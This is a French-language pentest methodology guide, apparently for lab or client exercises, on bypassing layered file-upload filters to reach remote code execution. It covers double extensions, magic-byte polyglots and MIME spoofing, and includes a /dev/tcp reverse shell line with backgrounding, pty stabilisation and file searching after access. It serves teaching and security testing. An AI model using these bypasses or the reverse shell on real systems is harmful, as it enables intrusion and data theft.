# Méthodologie — Contourner un système de validation d'upload de fichiers

**Contexte d'application.** Exercice type : une interface web permet l'upload de fichiers (avatar, document, image biométrique…) et applique plusieurs couches de contrôle successives pour empêcher l'upload de code exécutable. L'objectif est d'obtenir une exécution de code arbitraire (RCE) via ce vecteur. Ce document décrit la **méthode de travail** — l'ordre des tests, la logique de contournement couche par couche, la manière de stabiliser l'accès obtenu — pas la correction d'un cas particulier. Il est réutilisable tel quel.

**Analyste : Jean**

---

## Principe directeur

Un upload sécurisé repose presque toujours sur une **défense en profondeur empilée** : filtre d'extension, filtre de contenu, filtre de MIME type, parfois renommage aléatoire ou stockage hors webroot. Chaque couche a été ajoutée à un moment différent, souvent en réaction à un contournement précédent — elles ne sont donc pas conçues ensemble, ce qui laisse des angles morts.

La bonne démarche n'est pas de chercher un bypass unique et élégant, mais de **tester couche par couche, dans l'ordre où le serveur les évalue**, et de laisser le serveur lui-même révéler la couche suivante via ses messages d'erreur. Un système mal durci est souvent trop verbeux : c'est une source d'information à exploiter systématiquement.

Le fil conducteur tient en une phrase : *chaque filtre contourné doit être compris avant d'être franchi — un bypass qui marche sans qu'on sache pourquoi ne se reproduira pas sur un système différent.*

---

## Phase 1 — Cartographier les couches de validation

Avant tout payload élaboré, on envoie un fichier malveillant simple et évident (ex. un script serveur avec une commande d'exécution basique) pour faire réagir le premier filtre.

- **Observer le message d'erreur.** Est-il générique ("upload refusé") ou explicite ("seules les extensions X, Y, Z sont autorisées") ? Un message explicite est une fuite d'information à exploiter.
- **Identifier le type de contrôle en jeu :** extension du nom de fichier, signature/contenu du fichier, en-tête MIME de la requête HTTP, taille, nom aléatoire imposé côté serveur.
- **Ne jamais supposer qu'un seul filtre existe.** Le premier contournement révèle presque toujours une deuxième couche derrière — c'est le comportement attendu d'un système en défense en profondeur.

---

## Phase 2 — Contourner le filtre d'extension

Le filtre le plus superficiel vérifie uniquement le nom du fichier (souvent juste la dernière extension, parfois une regex plus large).

**Techniques à tester dans l'ordre :**
1. **Double extension** (`shell.php.jpg`) — exploite une éventuelle mauvaise configuration du serveur web (ex. Apache avec `mod_mime` mal configuré, qui peut traiter *chaque* extension du nom de fichier comme un handler potentiel, pas seulement la dernière).
2. **Casse alternée** (`shell.PhP`) si le filtre est sensible à la casse.
3. **Extensions alternatives interprétées par le serveur** (`.phtml`, `.php5`, `.pht` selon la stack).
4. **Null byte / caractères spéciaux** en fin de nom (`shell.php%00.jpg`) — technique historique, rarement efficace sur des piles modernes mais à garder en tête sur du legacy.

**Point clé :** ce contournement seul ne suffit généralement pas — il ne fait que passer le contrôle sur le *nom*. Le *contenu* du fichier est souvent vérifié séparément.

---

## Phase 3 — Contourner le filtre de contenu (validation de signature)

Un validateur plus poussé inspecte les premiers octets du fichier (magic bytes) pour vérifier qu'ils correspondent à un format d'image légitime, indépendamment de l'extension.

- **Principe du polyglotte.** On fait démarrer le fichier par une signature valide reconnue (ex. `GIF89a;` pour un GIF, `\xFF\xD8\xFF` pour un JPEG, en-tête PNG pour un PNG), puis on ajoute le code malveillant à la suite. Le validateur, qui ne lit généralement que le début du fichier, voit une image valide ; le serveur web, s'il traite le fichier comme du code exécutable (grâce au bypass de la Phase 2), exécute l'intégralité du contenu — y compris la partie après la signature.
- **Vérifier que le polyglotte reste syntaxiquement valide** dans les deux formats si le validateur pousse l'analyse plus loin qu'une simple vérification des premiers octets (auquel cas une vraie image contenant le payload injecté dans des métadonnées, par exemple, peut être nécessaire).

---

## Phase 4 — Contourner le filtre de MIME type

Certains systèmes vérifient également l'en-tête `Content-Type` envoyé dans la partie multipart de la requête HTTP au moment de l'upload — une donnée entièrement contrôlée côté client, donc falsifiable.

- **Repérer la valeur attendue.** Si le serveur la révèle dans un message d'erreur, c'est immédiat. Sinon, tester les valeurs standard (`image/jpeg`, `image/png`) puis des valeurs propriétaires si le contexte le suggère.
- **Intercepter et modifier la requête** plutôt que de compter sur le comportement automatique du navigateur (qui déduit le `Content-Type` depuis l'extension et ne laisse pas le choix) :
  - Un proxy d'interception (Burp Suite, etc.) permet de modifier l'en-tête à la volée sur une requête déclenchée depuis l'interface web.
  - `curl -F "file=@payload;type=<mime_voulu>"` permet de forcer directement le MIME type envoyé sans passer par un navigateur.
- **Vérifier le point d'entrée réel de l'upload** avant de construire une requête manuelle : ne pas supposer un chemin d'endpoint (`/upload.php` etc.) — l'inspecter via l'onglet réseau du navigateur ou le code source du formulaire (`<form action="...">`, `name` du champ `<input type="file">`). Un formulaire sans `action` explicite poste vers l'URL courante.

---

## Phase 5 — De l'upload à l'exécution (RCE)

Un fichier uploadé n'est une vulnérabilité confirmée que s'il est **atteignable et exécuté** par le serveur.

1. **Localiser le fichier stocké** — le message de succès de l'upload révèle souvent le chemin final (parfois renommé, parfois inchangé).
2. **Confirmer l'exécution** avec une commande inoffensive et vérifiable (`pwd`, `whoami`) plutôt qu'une commande destructrice — le but à ce stade est de prouver l'impact, pas de perturber le système.
3. **Comprendre les limites de l'exécution via URL** avant de vouloir aller plus loin : HTTP est sans état, donc chaque requête déclenche un nouveau processus isolé (pas de changement de répertoire persistant, pas d'input interactif), et chaque commande laisse une trace dans les logs d'accès. Cela justifie le passage à un reverse shell dès que l'objectif dépasse la simple preuve de RCE.

---

## Phase 6 — Établir et stabiliser un reverse shell

**Mise en écoute côté attaquant**, sur une IP **réellement joignable depuis la cible** — pas une IP locale quelconque, mais celle de l'interface réseau effectivement connectée au même segment que la cible (VPN, bridge de lab, etc.). Une erreur fréquente est de prendre la première IP trouvée sans vérifier qu'elle est sur le bon sous-réseau.

**Point critique souvent sous-estimé : le comportement du processus parent.** Une commande de reverse shell classique (`bash -i >& /dev/tcp/IP/PORT 0>&1`) exécutée directement via le paramètre d'une requête HTTP **bloque le processus serveur qui l'a lancée** tant que le shell reste ouvert. Selon la configuration du serveur web (gestion des workers, timeout), ce processus parent peut être interrompu, ce qui coupe immédiatement la connexion reverse — la commande de listen affichera alors une connexion reçue puis refermée aussitôt, sans qu'aucune interaction n'ait été possible.

**Solution : détacher le shell du processus qui l'a lancé**, pour que la requête HTTP se termine immédiatement pendant que le shell continue de tourner en tâche de fond, indépendant :
- Ajouter `&` en fin de commande pour la passer en arrière-plan.
- Utiliser `setsid` combiné à `< /dev/null` pour désolidariser complètement le nouveau processus du terminal/session parent, ce qui le rend plus robuste face aux coupures.

**Symptôme trompeur à connaître :** une fois la connexion établie sur le listener, il est fréquent de ne voir **aucun prompt s'afficher** (le shell obtenu est souvent non-interactif, sans TTY alloué). Ce n'est pas un échec — il faut taper une commande à l'aveugle (`whoami`) pour vérifier si le shell répond avant de conclure à un problème. Une fois confirmé, une stabilisation classique consiste à obtenir un vrai pseudo-terminal via `python3 -c 'import pty; pty.spawn("/bin/bash")'`.

---

## Phase 7 — Post-exploitation et preuve d'impact

- Une fois l'accès obtenu, **rechercher largement** plutôt que de deviner un chemin (`find / -name "<motif>" 2>/dev/null` — rediriger `stderr` vers `/dev/null` pour ne pas noyer le résultat utile sous les erreurs de permission).
- Prioriser les preuves d'impact qui parlent à un client non technique : accès à des données hors du périmètre attendu (hors webroot notamment), possibilité de lecture de fichiers sensibles, élévation de privilèges potentielle depuis le compte de service obtenu (souvent un compte applicatif à faibles privilèges type `www-data`, à mentionner explicitement dans le rapport — l'impact réel dépend de ce qui est atteignable depuis ce compte).

---

## Erreurs fréquentes à éviter

| Erreur | Conséquence | Bonne pratique |
|---|---|---|
| Construire un payload complexe avant d'avoir vu le premier message d'erreur | Perte de temps sur un contournement inutile | Toujours commencer par un test simple et lire la réponse du serveur |
| Supposer l'URL/l'endpoint d'upload sans le vérifier | Requêtes manuelles qui échouent (404) sans lien avec le vrai problème | Inspecter le formulaire ou le trafic réseau avant de reconstruire une requête à la main |
| Lancer un reverse shell bloquant directement via une requête HTTP | Connexion reçue puis coupée immédiatement, diagnostic confus | Toujours détacher le processus (`&`, `setsid`) dès le premier essai |
| Interpréter l'absence de prompt comme un échec | Abandon prématuré d'un shell en réalité fonctionnel | Taper une commande à l'aveugle avant de conclure |
| Modifier plusieurs paramètres à la fois (extension + contenu + MIME) dans un seul essai | Impossible d'identifier quelle couche bloque encore | Isoler et valider chaque couche indépendamment avant de passer à la suivante |

---

## Checklist réutilisable

- [ ] Test initial avec payload simple → lecture du message d'erreur
- [ ] Identification du filtre d'extension → contournement (double extension, casse, extensions alternatives)
- [ ] Identification du filtre de contenu → construction d'un polyglotte avec signature valide
- [ ] Identification du filtre MIME → interception/spoofing du `Content-Type`
- [ ] Vérification de l'endpoint réel (formulaire / trafic réseau) avant requête manuelle
- [ ] Confirmation RCE via commande inoffensive (`pwd`, `whoami`)
- [ ] Reverse shell avec IP correcte du bon segment réseau
- [ ] Backgrounding du reverse shell (`&` / `setsid`) pour éviter la coupure liée au processus parent
- [ ] Stabilisation du shell (test à l'aveugle, puis `pty.spawn` si besoin)
- [ ] Recherche large des fichiers sensibles (`find / -name ... 2>/dev/null`)
- [ ] Documentation de l'impact réel (compte obtenu, périmètre atteint, données accessibles)
